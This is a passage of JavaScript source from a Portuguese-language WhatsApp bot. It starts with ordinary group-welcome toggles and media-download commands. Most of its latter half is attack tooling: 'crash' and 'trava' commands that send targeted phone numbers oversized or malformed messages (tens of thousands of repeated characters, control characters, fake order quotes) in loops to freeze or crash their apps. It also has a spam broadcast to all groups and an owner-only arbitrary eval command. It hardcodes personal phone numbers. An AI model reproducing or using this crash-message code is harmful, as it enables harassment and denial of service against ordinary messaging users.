fs.writeFileSync('./fun√ß√µes de cmd/usuarios/vacilo3.json', JSON.stringify(welkom3))
reply('[üíß] Ativou com sucesso o recurso de bem vindo neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isWelkom3) return reply('Ja esta Desativado')
pesquisar = from
processo = welkom3.indexOf(pesquisar)
while(processo >= 0){
welkom3.splice(processo, 1)
processo = welkom3.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/vacilo3.json', JSON.stringify(welkom3))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de bemvindo neste grupo‚úîÔ∏è')
} else {
reply(`Digite da forma correta:\nComando: ${prefix + command} 1, para ativar e 0 para desativar`)
}
break

case 'bemvindo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
buttons252 = [
{buttonId:`${prefix}bemvindo33 1`, buttonText: {displayText: 'Ligar'}, type: 1},
{buttonId: `${prefix}bemvindo33 0`, buttonText: {displayText: 'Desligar'}, type: 1}]
buttonMessage252 = {
text: "‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿú[üíß]‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ\n BEM - VINDO 3\n‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿú[üíß]‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ",
footer: '[üíß] BEM - VINDO 3 \nùòæùô§ùô¢ ùôÄùô®ùô©ùôö ùòæùô§ùô¢ùôñùô£ùôôùô§ ùòºùô©ùôûùô´ùôñùôôùô§\nùôåùô™ùôöùô¢ ENTRAR ùôâùô§ ùôÇùôßùô™ùô•ùô§ ',
buttons: buttons252,
headerType: 1
}
sendMsg = await pl.sendMessage(from, buttonMessage252, {quoted:selo})
break

case 'bemvindo2':
case 'welcome':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isWelkom2) return reply('Ja esta ativo')
welkom2.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/welkom.json', JSON.stringify(welkom))
reply('üåÄ Ativou com sucesso o recurso de bem vindo neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isWelkom2) return reply('Ja esta Desativado')
pesquisar = from
processo = welkom2.indexOf(pesquisar)
while(processo >= 0){
welkom2.splice(processo, 1)
processo = welkom2.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/welkom2.json', JSON.stringify(welkom))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de bemvindo neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'bemvindo1':
pl.sendMessage(from, {text: `ùë©ùë¨ùë¥ ùëΩùë∞ùëµùë´ùë∂

ùó£ùóòùóóùóúùó® ùó¢ ùóñùó¢ùó†ùóîùó°ùóóùó¢:
${pushname}

${NomeDoBot}`, footer: `üå∏ATIVA/DESATIVAR AQUI EM BAIXOüå∏`, buttons: [{buttonId: `${prefix}Bemvindo_ 1`, buttonText: {displayText: '‚úîATIVAR'}, type: 1}, {buttonId: `${prefix}Bemvindo_ 0`, buttonText: {displayText: '‚ùåDESATIVAR'}, type: 1}]}, {quoted: selo})
break

case 'bemvindo_':
case 'welcome_':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if(!SoDono) return reply("Comando Desativado temporariamente para teste...")
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Ja esta ativo')
welkom.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/welkom.json', JSON.stringify(welkom))
reply('üåÄ Ativou com sucesso o recurso de bem vindo neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isWelkom) return reply('Ja esta Desativado')
pesquisar = from
processo = welkom.indexOf(pesquisar)
while(processo >= 0){
welkom.splice(processo, 1)
processo = welkom.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/welkom.json', JSON.stringify(welkom))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de bemvindo neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiaudio':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiAudio) return reply('Ja esta ativo')
antiaudio.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antiaudio.json', JSON.stringify(antiaudio))
reply('Ativou com sucesso o recurso de anti audio neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiAudio) return reply('Ja esta Desativado')  
antiaudio.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antiaudio.json', JSON.stringify(antiaudio))
reply('Desativou com sucesso o recurso de anti audio neste grupo‚úîÔ∏è')
} else {
if(isAntiAudio){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêÄùêîùêÉùêàùêé

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti audio est√° ${isAntiAudio ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'infobemvindo':
case 'infobv':  
await pl.sendMessage(from, {text: infobemvindo(prefix)}, {quoted: selo})
break

//==============baixar/PESQUISAS=============


case 'pinterest': 
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} cat`)
reply(enviar.espere)
hx.pinterest(q)
.then(result => {
angkaa = ['1','2','3','4','5','6','7','8','9']
const randomnay2 = angkaa[Math.floor(Math.random() * (angkaa.length))]	
const buttons01 = [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
const buttonMessage01 = {image: {url: result[randomnay2]},caption: "AQUI EST√Å!!",footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO',buttons: buttons01,headerType: 4}
pl.sendMessage(from, buttonMessage01, {quoted:selo}).catch(e => {
reply('Erro, nenhuma imagem recebida.')
})}) 
break 

case 'wallpaper': {
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} fotos`)
  reply(enviar.espere)
  anu = await wallpaper(q)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonswallpaper = [{buttonId: `${prefix}wallpaper ${q}`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
  pl.sendMessage(from, { image: { url: result.image[0] }, caption: `AQUI EST√Å!!`, footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO',buttons: buttonswallpaper }, { quoted: selo }).catch(e => {
reply('Erro, nenhuma imagem recebida.')
})
  }
  break

case 'tiktok2':
{
  if (!q) return reply('Cad√™ o link?')
  reply(mess.wait)

let buttons = [
{buttonId: `${prefix}tiktokvideo ${q}`, buttonText: {displayText: 'üé• V√≠deo'}, type: 1},
{buttonId: `${prefix}tiktokaudio ${q}`, buttonText: {displayText: 'üé∂ Audio'}, type: 1}
]
let thumbInfo = `${pushname} \n_*M√çDIA ENCONTRADAüé¨!!!*_`;
testeImage = await getBuffer(`https://telegra.ph/file/4f12e1961dc5c3c72cc2f.jpg`);

buttonMessage = {image: testeImage, caption: `${thumbInfo}`, footer: `*Bem fa√ßa a sua escolha amigo ü§®*`, buttons: buttons, headerType: 4}
pl.sendMessage(from, buttonMessage, {quoted:selo})
}
break

case 'tiktokvideo':
case 'tiktok':
try {
if(!q) return reply("Cad√™ o link?")
if(!isUrl(args[0]) || !args[0].includes("tiktok")) return reply("Limk inv√°lido")
sex = await xfar.downloader.tiktok(args[0])
plsexual = []
for (let plgay of sex.media) {
if (plgay.quality === "hd") plsexual.push(plgay.url)
}
if(plsexual.length === 0) return reply("N√£o consegui encontrar o v√≠deoüòï")
plviado = await getBuffer(`${plsexual[Math.floor(Math.random() * plsexual.length)]}`)
pl.sendMessage(from, {video: plviado, caption: `${sex.title}`}, {quoted: selo})
} catch {
reply("Deu erro üòî")
}
break


case 'tiktokaudio':
case 'ttkaudio':
reply("T√Å EM MANUTEN√á√ÉO")
break

case 'execut':
donoprincipal = '556593065507@s.whatsapp.net'
if (!donoprincipal.includes(sender)) return 
try {
return eval(`(async() => { ${args.join(' ')}})()`)
} catch (e) {
reply(`${e}`)
}
break

  case 'pinterest2': 
try {
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} cat`)
reply(enviar.espere)
blap = await getBuffer(`https://api-manuella2-pl.herokuapp.com/api/pinterest?text=${q}&apikey=${keyapi}`)
await pl.sendMessage(from, {image: blap, thumbnail: null}, {quoted: selo}).catch(e => {
reply('ERROR!!')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'tradutor': case 'traduzir':
try {
if(!q) return reply(`Exemplo : ${prefix}tradutor HI`)
bla = await fetchJson(`https://api-manuella2-pl.herokuapp.com/api/tradutor?text=${args.join(" ")}&idioma=pt&apikey=${keyapi}`)
blatxt = ` [ü©∏] Ol√° ${pushname} [ü©∏] \n\n seu texto ${q} foi traduzida pra ->\n\n ${bla.bla}`
blalogo = await getBuffer(`${logo}`)
pl.sendMessage(from, {text: blatxt, contextInfo: { externalAdReply:{title: `[ü©∏] TRADUZIDO [ü©∏] `,body:"", previewType:"PHOTO",thumbnail: blalogo}}}, {quoted: m}).catch(e => {
reply("ERROR!!")
console.log(e)
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'gimage':
case 'google':
try {
if (!q) return reply(`O que voc√™ est√° procurando?\n\nEx.: ${prefix + command} gatinhos fofinhos`)
let gis = require('./fun√ß√µes de cmd/fun√ß√µes/gimage.js')
gis(args.join(" "), async (error, result) => {
if (error) {
return sendBtext(from, `Ocorreu um erro`, `Aperte no bot√£o abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
}
n = result
try {
images = n[Math.floor(Math.random() * n.length)]
let buttons = [
{buttonId: `${prefix}gimage ${args.join(" ")}`, buttonText: {displayText: 'Proximo'}, type: 1}
]
let buttonMessage = {
image: { url: images.url },
caption: `Pronto!`,
buttons: buttons,
headerType: 4,
}
pl.sendMessage(from, buttonMessage, { quoted: info })
} catch {
sendBtext(from, `Nenhuma imagem recebida.`, `Aperte no bot√£o abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
}
})
} catch {
sendBtext(from, `Ocorreu um erro`, `Aperte no bot√£o abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
console.log("O MODULO caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar") 
}
break




case 'pesquisar':
blar = Math.floor(Math.random() * 5)
bla = await fetchJson(`https://api-manuella2-pl.herokuapp.com/api/gimage?txt=${q}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.result[`${blar}`].url) 
pl.sendMessage(from, {image: blabla}).catch(e => {
reply("ERROR, n√£o foi encontrado, tente novamente...")
})
break

case 'igdl':
case 'instadw': 
try {  
link = args.join(' ')
if (!link) return reply('Ops, insira o link de um video/foto do instagram.')
post = await fetchJson(`http://nezsab-apis.xyz/api/instagram?url=${link}&apikey=${keyapi}`)
s_video = await getBuffer(post.resultado[0].downloadUrl)
pl.sendMessage(from, {video: s_video}, {quoted: selo})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!')
}
}
break


//========FINAL DAS PESQUISAS=============

case 'spamenviar': {
if (!SoDono && !isCmdy && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!q) return reply( `Texto onde?\n\nExemplo : ${prefix + command} BOA VISTA `)
let getGroups = await pl.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (let i of anu) {
await sleep(1500)
let txt = `üî•ATK DE SPAM AGORA üî•\nMande msg e depois bloqueia 6√ó \nwa.me/${q}`
pl.sendMessage(i, {text: txt})
}
reply(`Enviando com sucessoüî•`)
}
break

//========TRAVAS=============\\
case 'loc': case 'travaloc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${funeral}`,addrees: '¬©  _Copyright by Yuri Modz_'}},{quoted:m})
break

case 'loc4': case 'travaloc4': 
addFilter(from);
if (!SoDono) return reply(`„Äé‚ùó„ÄèSomente meu dono pode usar esse comando.`)
pl.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${buttonkal}\n${travavideo}`,addrees: '¬©  _Copyright by Yuri Modz_'}},{quoted:m})
break

case'loc5': case 'travaloc5': 
addFilter(from);
if (!SoDono) return reply(`„Äé‚ùó„ÄèSomente meu dono pode usar esse comando.`)
pl.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${buttonkal}\n${travavideo}\n${doc}\n${listbug}\n${ngazap}`,addrees: '¬©  _Copyright by Yuri Modz__'}},{quoted:m})
break

case 'loc8': case 'travaloc8':
addFilter(from);
if (!SoDono) return reply(`„Äé‚ùó„ÄèSomente meu dono pode usar esse comando.`)
pl.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}`,addrees: '¬©  _Copyright by Yuri Modz__'}},{quoted:m})
break

case 'matahome': case 'matabutton':
addFilter(from);
if (!SoDono) return reply(`„Äé‚ùó„ÄèSomente meu dono pode usar esse comando.`)
pl.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${home}\n${home}\n${home}\n${home}\n${home}\n${home}\n${home}`,addrees: '¬©  _Copyright by Yuri Modz__'}},{quoted:m})
break

case 'travavideo': {
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
                await pl.sendMessage(m.chat, {video: fs.readFileSync(`./src/travas/mor.mp4`), caption: `${porra}`}, {quoted: selo})
            }
            break

case 'travafoto3': {
addFilter(from);
if (!SoDono) return reply(`„Äé‚ùó„ÄèSomente meu dono pode usar esse comando.`)
pl.sendMessage(m.chat, {image: fs.readFileSync('./src/travas/travafoto3.jpg'), caption: `${buttonkal}\n${travavideo}\n${doc}\n${listbug}\n${ngazap}`}, {quoted: selo})
}
break

case 'crash':
if(!SoDono) return reply(enviar.msg.donosmt)
try{
var mentioned = msg.message.extendedTextMessage.contextInfo.participant
}catch{
mentioned = args.join(' ').replace(new RegExp("[()+ -/ +/]", "gi"), "").split('/')[0]
}
if(!mentioned || (mentioned == ''))return reply('Erro em identificar men√ß√£o')
reply("pronto! crashando...")
for(i = 0;i< q.includes('/') ? Number(q.split('/')[1]): 5;i++){
await delay(2000)
if(i == Number(q.includes('/') ? q.split('/')[1] : 5))reply('prontim chefe')
var userio = mentioned.replace('@s.whatsapp.net', '').replace('@')
let selocrrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
pl.sendMessage(`${userio}@s.whatsapp.net`, {text: 'üòàùòæùôßùôñùô®ùôùùôñùô£ùôôùô§ ùôèùô™ùôôùô§üòà'}, {quoted: selocrrash}) 
}
break

case 'crash1':
try {
if(!SoDono) return reply("Quem √© voc√™?")
if(q && args[0] === " ") {
guxta_lindaokk = ""
for (var i = 0; i < 10; i++) {
guxta_lindaokk += "üí§"
}
tekks = ""
for (var i = 0; i < 100; i++) {
tekks += "ÿÖÿÄÿÅÿÇÿÉÿÑ"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‚Äç"
}
let buttons = [
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokk}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokk}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokk}, type: 1}
]
fuck = {
text: `‚ù§‚Äçüî• ùêÇùêöùê©ùêûùê≠ùê¢ùêßùê°ùêö Akame üòà${tekkss}${tekks}`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: guxta_lindaokk, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await pl.sendMessage(from, fuck, {quoted:selocrash})
await pl.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 1
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return reply(`Cade o n√∫mero?`)
let [result] = await pl.onWhatsApp(id)
if(!result) return reply(`Numero inexistente`)
guxta_lindaokk = ""
for (var i = 0; i < 60000; i++) {
guxta_lindaokk += "üí§"
}
let buttons = [
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokk}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokk}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokk}, type: 1}
]
fuck = {
text: `‚ù§‚Äçüî• ùêÇùêöùê©ùêûùê≠ùê¢ùêßùê°ùêö Akame üòà`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: guxta_lindaokk, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await pl.sendMessage(result.jid, fuck, {quoted:selocrash})
await sleep(500)
}
pl.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
reply("Hmm deu erro")
}
break

case 'crash2':
try {
if(!SoDono) return reply(enviar.msg.donosmt)
if(q && args[0] === "-fake") {
guxta_lindaokkkj = ""
for (var i = 0; i < 100; i++) {
guxta_lindaokkkj += "üí§"
}
tekks = ""
for (var i = 0; i < 200; i++) {
tekks += "ÿÖÿÄÿÅÿÇÿÉÿÑ"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‚Äç"
}
let button = [
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokkkj}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokkkj}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokkkj}, type: 1}
]
fuck = {
text: `‚ù§‚Äçüî• ùêÇùêöùê©ùêûùê≠ùê¢ùêßùê°ùêö üòà${tekkss}${tekks}`,
button: button,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: guxta_lindaokkkj, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await pl.sendMessage(m.chat, fuck, {quoted:selocrash})
await pl.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = mek.message.extendedTextMessage.contextInfo.mentionedJid[0] ? mek.message.extendedTextMessage.contextInfo.mentionedJid[0] : mek.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 1
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return reply(`Cad√™ o n√∫mero?`)
let [result] = await pl.onWhatsApp(id)
if(!result) return reply(`Numero inexistente`)
guxta_lindaokkkj = ""
for (var i = 0; i < 60000; i++) {
guxta_lindaokkkj += "üí§"
}
let button = [
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokkkj}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokkkj}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: guxta_lindaokkkj}, type: 1}
]
fuck = {
text: `‚ù§‚Äçüî• ùêÇùêöùê©ùêûùê≠ùê¢ùêßùê°ùêö üòà`,
button: button,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: guxta_lindaokkkj, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await pl.sendMessage(result.jid, fuck, {quoted:selocrash})
await sleep(500)
}
pl.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
reply("Hmm deu erro")
}
break

case 'crash3':
if(!SoDono) return reply(enviar.msg.donosmt)
reply('cad√™ o nmr?') 
var count = 0;
var interval;
try {
swi_from = q.replace(new RegExp("[()+-/ +/]", "gi"), "").replace("@", '') + "@s.whatsapp.net";
if (q.indexOf('@') !== q.lastIndexOf('@')) return reply("N√£o pode mencionar 2 (dois) membros.")
if (swi_from != "" && swi_from != "@s.whatsapp.net") {
reply('Opa, j√° est√° indo de F!')
seoplooo = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "derrubado üòéüëçüèª" } }
interval = setInterval(() => {
 count++;
 if (count == 150) {
   clearInterval(interval);
 }
pl.sendMessage(swi_from, {text: ' '}, {quoted: seoplooo})
}, 500)
} else {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque a mensagem da pessoa');
reply('Opa, j√° est√° indo de F!')
seoplooo = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "derrubadoüòà" } }
interval = setInterval(() => {
 count++;
 if (count == 150) {
   clearInterval(interval);
 }
pl.sendMessage(`${mentioned}@s.whatsapp.net`, {text: ' '}, {quoted: seoplooo})
}, 500)
}
} catch (e) {
reply(String(e).includes("TypeError: Cannot read properties of null (reading 'contextInfo')") ? `‚ùå Erro! N√£o foi poss√≠vel indentificar o tipo de marca√ß√£o/men√ß√£o.\n\n‚û°Ô∏è Exemplos:\n${prefix + command } @${numerodono[0].split("@")[0]}\n${prefix + command } ${numerodono[0].split("@")[0]}\nOu marque a mensagem do membro com ${prefix + command }`: reply('erro'))
console.log("Error : %s", color(e, "red"));
}
break

case 'suicidagp':
case 'matargp':
case 'crashgp':
if(!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply(enviar.msg.donosmt)
reply('üòàùòæùôßùôñùô®ùôùùôñùô£ùôôùô§ ùôèùô™ùôôùô§üòà') 
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
pl.sendMessage(from, {text: 'üòàùòæùôßùôñùô®ùôùùôñùô£ùôôùô§ ùôèùô™ùôôùô§üòà'}, { quoted: audcrash}) 
break

case 'crashuser':
if(!SoDono) return sendButtonText(from, `\t\t*‚ÄºÔ∏èACESSO NEGADO‚ÄºÔ∏è*`,`‚ùó${pushname}, Voc√™ N√£o Tem Acesso Ao Comando De Crashuser.`, {quoted: info});
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 5582999999`)
sendBtext(from, "üòàÔ∏è ùòæùôçùòºùôéùôÉùôêùôéùôÄùôç ùôâùôäùôëùòºùôàùôÄùôâùôèùôÄ? üòàÔ∏è\n", `‚ÄºÔ∏è${pushname} O Alvo: ${q} J√° Recebeu Crashuser‚Ä¶¬†Voc√™ Deseja Matar Esse N√∫mero Novamente?‚ÄºÔ∏è`, [ {buttonId: `${prefix}crash2 ${q}`, buttonText: {displayText: `MATAR‚ò†Ô∏è`}, type: 1}, {buttonId: `${prefix}tchau`, buttonText: {displayText: `NAO üëã`}, type: 1}], selo);
let telpr = args.join(' ')
let craahspp = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "nada haver isso a√≠ animal" } }

if (telpr == '556593065507') return reply('N√£o √© poss√≠vel usar crashuser o n√∫mero do meu Mestre.');
if (telpr == '556593065507') return reply('N√£o √© poss√≠vel usar crashuser o n√∫mero do bot.');
if (telpr == '556593065507') return reply('N√£o e poss√≠vel usar crashuser nesse n√∫mero');
if (telpr == '556593065507') return reply('N√£o e poss√≠vel usar crashuser nesse n√∫mero.');
pl.sendMessage(`${telpr}@s.whatsapp.net`, {text: 'bom dia!'}, {quoted: craahspp })
break

case 'crashuserpv':
reply('üòàùòæùôßùôñùô®ùôùùôñùô£ùôôùô§ ùôèùô™ùôôùô§üòà') 
if (!SoDono) return SoDono()
const tiim = args.join(" ") 
const nums = tiim.replace(/\D+/g, '');
if ( nums == "5521980165356" ) return env2("N√£o e poss√≠vel enviar crashuser pro meu Mestre!", "üö´");
if ( nums == "5521970623638" ) return env2("N√£o e poss√≠vel enviar crashuser!", "üö´");
if ( nums == "5511988255956" ) return env2("N√£o e poss√≠vel enviar crashuser!", "üö´");
if ( nums == "558288279194Ô∏è" ) return env2("N√£o e poss√≠vel enviar crashuser!", "üö´");
let selooo = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "nada haver isso a√≠ animal" }, }
pl.sendMessage(`${nums}@s.whatsapp.net`, {text: 'tess'}, {quoted: selo})
break

case 'tchau':
